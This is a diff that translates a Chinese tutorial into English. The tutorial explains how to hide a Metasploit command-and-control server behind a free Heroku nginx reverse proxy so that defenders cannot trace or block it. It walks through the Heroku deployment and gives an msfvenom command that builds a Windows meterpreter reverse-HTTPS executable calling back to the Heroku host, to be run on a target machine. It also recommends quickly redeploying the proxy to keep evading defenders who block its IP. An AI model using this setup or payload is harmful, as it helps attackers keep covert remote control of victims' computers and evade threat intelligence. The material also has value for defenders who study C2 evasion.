@@ -1,88 +1,102 @@
-# 利用heroku隐藏C2服务器(简单/零成本)
+# Hiding C2 Server Using Heroku (Simple/Zero Cost)
 
-# 前言
-本篇文章介绍如何使用heroku实现隐藏metasploit-framework的C2服务,相比较于业界流行的 `域前置` `CDN` `重定向` 三种隐藏C2的方法,本篇文章介绍的方法操作简单,在与 `威胁情报` 和 `IP封锁` 对抗过程成本更低(无论是时间成本还是资金成本).
+# Preface
 
-# 当前流行的隐藏C2技术
-`域前置` `CDN` `重定向`[ ](https://me.csdn.net/qq_41874930)是当前流行的三种隐藏C2的技术. Shanfenglan7 在其文章 [利用CDN、域前置、重定向三种技术隐藏C2的区别](https://blog.csdn.net/qq_41874930/article/details/109008708) 中进行了非常细致的说明,笔者在实际测试三种技术发现,每种技术都有一些不足.
+This article introduces how to use Heroku to achieve the hiding of C2 services in the metasploit-framework. Compared with the three popular methods of "domain fronting", "CDN",
+and "redirection" in the industry for hiding C2, the method introduced in this article is simple to operate and has lower costs (whether it is time cost or financial cost) in the
+process of confrontation with "threat intelligence" and "IP blocking".
 
-## CDN隐藏C2
-使用CDN隐藏C2的准备工作大致如下
+# Currently Popular C2 Hiding Technologies
 
-+ 需要购买域名 (可以通过[https://www.freenom.com/](https://www.freenom.com/)使用免费的)
-+ 需要购买CDN服务 (可以使用免费的[https://www.cloudflare.com/](https://www.cloudflare.com/))
-+ 需要在CDN服务商处修改DNS记录
-+ 需要等待DNS记录生效(如果你的域名绑定过其他IP,这个操作需要几个小时)
+"Domain fronting", "CDN", and "redirection" [](https://me.csdn.net/qq_41874930) are the three currently popular C2 hiding technologies. Shanfenglan7 has made a very detailed
+explanation in his
+article [The Differences in Hiding C2 Using Three Technologies of CDN, Domain Fronting, and Redirection](https://blog.csdn.net/qq_41874930/article/details/109008708). The author
+found through actual testing of the three technologies that each technology has some shortcomings.
 
-可以看到,虽然通过组合免费服务可以实现零成本,但是实现过程中需要进行很多配置操作,时间成本及心智成本过高.如果域名不是匿名注册,还有被追踪溯源的风险.
+## Hiding C2 with CDN
 
-## 域前置隐藏C2
-使用域前置隐藏C2的准备工作大致如下
+The preparatory work for hiding C2 using CDN is roughly as follows:
 
-+ 需要购买域名 (可以通过[https://www.freenom.com/](https://www.freenom.com/)使用免费的)
-+ 需要购买CDN服务 (可以使用免费的[https://www.cloudflare.com/](https://www.cloudflare.com/))
-+ 需要在CDN服务商处修改DNS记录
-+ 需要等待DNS记录生效(如果你的域名绑定过其他IP,这个操作需要几个小时)
-+ 需要知道cdn上的其他高信誉域名或者ip
-+ 需要修改malleable profile文件
++ Need to purchase a domain name (you can use a free one through [https://www.freenom.com/](https://www.freenom.com/))
++ Need to purchase CDN services (you can use the free [https://www.cloudflare.com/](https://www.cloudflare.com/))
++ Need to modify DNS records at the CDN service provider
++ Need to wait for the DNS records to take effect (if your domain name is bound to other IPs, this operation requires several hours)
 
-域前置相对于CDN还要进行更多的额外操作,而且当前主流CDN服务商都已经开始屏蔽域前置技术.
+It can be seen that although zero cost can be achieved by combining free services, there are many configuration operations required during the implementation process, and the time
+cost and mental cost are too high. If the domain name is not registered anonymously, there is a risk of being traced and sourced.
 
-## 重定向隐藏C2
-使用重定向隐藏C2的准备工作大致如下
+## Hiding C2 with Domain Fronting
 
-+ 需要两台VPS
-+ 使用apache或者nginx配置重定向转发
-+ 需要修改malleable profile文件
+The preparatory work for hiding C2 using domain fronting is roughly as follows:
 
-重定向需要进行一些额外的编码及部署工作,而且还需要将一台VPS的IP地址暴露给 威胁情报 ,可能被溯源,其实并没有实现隐藏C2的目标.
++ Need to purchase a domain name (you can use a free one through [https://www.freenom.com/](https://www.freenom.com/))
++ Need to purchase CDN services (you can use the free [https://www.cloudflare.com/](https://www.cloudflare.com/))
++ Need to modify DNS records at the CDN service provider
++ Need to wait for the DNS records to take effect (if your domain name is bound to other IPs, this operation requires several hours)
++ Need to know other high-reputation domain names or IPs on the CDN
++ Need to modify the malleable profile file
 
-# 利用heroku隐藏C2服务器
-Heroku是一个支持多种编程语言的云平台即服务。简单理解就是可以免费部署docker容器并且可以开放web服务到互联网.下面介绍操作步骤.
+Domain fronting requires more additional operations than CDN, and the current mainstream CDN service providers have begun to block domain fronting technology.
 
-+ 首先注册Heroku账号，点击通过 [https://dashboard.heroku.com](https://dashboard.heroku.com/) 注册一个账号 (推荐使用gmail)
-+ 注册成功以后登录，登录以后点击 [部署链接](https://dashboard.heroku.com/new?template=https://github.com/FunnyWolf/nginx-proxy-heroku),
-+ app名称填写为 `mydiydomain` (可自定义,名称为后续域名前缀)，TARGET环境变量填写为C2的handler地址
+## Hiding C2 with Redirection
 
-![1603771065455-e03973a0-8763-4402-8b92-db358f8d0b1f.webp](./img/2q91t2VyvScAis4f/1603771065455-e03973a0-8763-4402-8b92-db358f8d0b1f-908601.webp)
+The preparatory work for hiding C2 using redirection is roughly as follows:
 
-+ 然后点击 Deploy app 系统会自动部署.
-+ 在metasploit-framework中添加handler,配置如图
++ Need two VPS
++ Use apache or nginx to configure redirection forwarding
++ Need to modify the malleable profile file
 
-![1603771665090-ad5c1ecd-c257-44f3-9128-4430183a2e34.webp](./img/2q91t2VyvScAis4f/1603771665090-ad5c1ecd-c257-44f3-9128-4430183a2e34-815196.webp)![1603771713694-163331e4-cb96-4bb9-aa79-84980ab9c4ee.webp](./img/2q91t2VyvScAis4f/1603771713694-163331e4-cb96-4bb9-aa79-84980ab9c4ee-199518.webp)
+Redirection requires some additional encoding and deployment work, and it also needs to expose the IP address of one VPS to "threat intelligence", which may be traced back, and in
+fact, the goal of hiding C2 has not been achieved.
 
+# Hiding C2 Server Using Heroku
 
+Heroku is a cloud platform as a service that supports multiple programming languages. Simply put, it can deploy docker containers for free and open web services to the Internet.
+The following are the operation steps.
 
-+ 执行 `to_handler` 生成listener
-+ 使用如下命令生成payload
++ First, register a Heroku account. Click to register an account through [https://dashboard.heroku.com](https://dashboard.heroku.com/) (it is recommended to use gmail).
++ After successful registration, log in. After logging in, click on
+  the [deployment link](https://dashboard.heroku.com/new?template=https://github.com/FunnyWolf/nginx-proxy-heroku).
++ Fill in the app name as "mydiydomain" (it can be customized. The name is the prefix of the subsequent domain name), and fill in the TARGET environment variable as the C2 handler
+  address.
+
+![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\1.webp)
+
++ Then click "Deploy app" and the system will deploy automatically.
++ Add a handler in the metasploit-framework and configure as shown in the figure.
+
+![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\2.webp)![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\3.webp)
+
++ Execute "to_handler" to generate a listener.
++ Use the following command to generate a payload:
 
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=mydiydomain.herokuapp.com LPORT=443 -f exe -o ~/payload.exe
 ```
 
-+ 上传运行目标机器运行即可
++ Upload and run it on the target machine.
 
-# 运行效果
-+ 在metasploit-framework中查看session如下,可以看到session的链接地址为heroku中转服务器地址
+# Running Effect
 
-![1603772048769-0192b120-768f-45ef-986f-4c13d4c1fae4.webp](./img/2q91t2VyvScAis4f/1603772048769-0192b120-768f-45ef-986f-4c13d4c1fae4-265798.webp)
++ View the session in the metasploit-framework as follows. It can be seen that the link address of the session is the heroku transit server address.
 
-+ 在目标机抓包效果如下
+![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\4.webp)
 
-![1603772254394-2251f568-89ae-48de-9c55-36b864bbffb0.webp](./img/2q91t2VyvScAis4f/1603772254394-2251f568-89ae-48de-9c55-36b864bbffb0-297458.webp)
++ The packet capture effect on the target machine is as follows:
 
-![1603772434299-3721e8f1-0eae-4296-b735-a741b20830d8.webp](./img/2q91t2VyvScAis4f/1603772434299-3721e8f1-0eae-4296-b735-a741b20830d8-167182.webp)
+![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\5.webp)
 
-![1603772464467-3e81edaf-c634-42de-8e79-8ef5091a7c03.webp](./img/2q91t2VyvScAis4f/1603772464467-3e81edaf-c634-42de-8e79-8ef5091a7c03-188615.webp)
+![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\6.webp)
 
-# 总结
-heroku隐藏C2从技术原理上看非常简单,使用heroku服务部署nginx反向代理服务,payload连接heroku的nginx,nginx将流量转发到C2.具体优势如下:
+![](img\utilize_heroku_to_hide_c2_server_simple_zero_cost\7.webp)
 
-+ 只需要注册heroku免费账号即可
-+ 无需注册或购买域名
-+ 自带可信的SSL证书(heroku域名自带证书)
-+ 如果IP地址被封锁,可删除原有heroku app重新部署heroku app(大约需要30s),与防守人员持续对抗
-+ 操作步骤简单
+# Summary
 
+From a technical perspective, hiding C2 with Heroku is very simple. Use the Heroku service to deploy an nginx reverse proxy service. The payload connects to Heroku's nginx, and
+nginx forwards the traffic to C2. The specific advantages are as follows:
 
-
++ Only need to register a free Heroku account.
++ No need to register or purchase a domain name.
++ It comes with a trusted SSL certificate (the Heroku domain comes with a certificate).
++ If the IP address is blocked, you can delete the original Heroku app and redeploy the Heroku app (about 30s), and continuously confront the defenders.
++ The operation steps are simple.
